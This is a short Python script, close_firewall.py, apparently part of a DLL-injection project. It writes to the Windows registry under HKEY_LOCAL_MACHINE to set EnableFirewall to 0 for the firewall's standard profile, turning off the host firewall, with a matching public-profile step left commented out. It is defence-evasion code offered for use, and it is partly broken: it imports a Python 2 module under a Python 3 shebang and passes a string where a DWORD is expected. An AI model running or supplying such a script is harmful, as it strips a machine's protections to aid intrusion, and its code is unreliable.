#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/12/24 16:19
# @Author   : ordar
# @File     : close_firewall.py
# @Project  : dll_injection2.py
# @Python   : 3.7.5
import sys
from _winreg import *

varSubKey = r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"
varStd = r"\StandardProfile"
varPub = r"\PublicProfile"
varEnbKey = "EnableFirewall"
varOff = 0

try:
    varReg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
    # varKey = OpenKey(varReg, varSubKey + varStd)
    varKey = CreateKey(varReg, varSubKey + varStd)
    SetValueEx(varKey, varEnbKey, 0, REG_DWORD, '0')
    CloseKey(varKey)

    # varKey = CreateKey(varReg, varSubKey + varPub)
    # SetValueEx(varKey, varEnbKey, varOff, REG_DWORD, str(varOff))
    # CloseKey(varKey)
    CloseKey(varReg)

except:
    errorMsg = "Exception Outter:", sys.exc_info()[0]
    print(errorMsg)



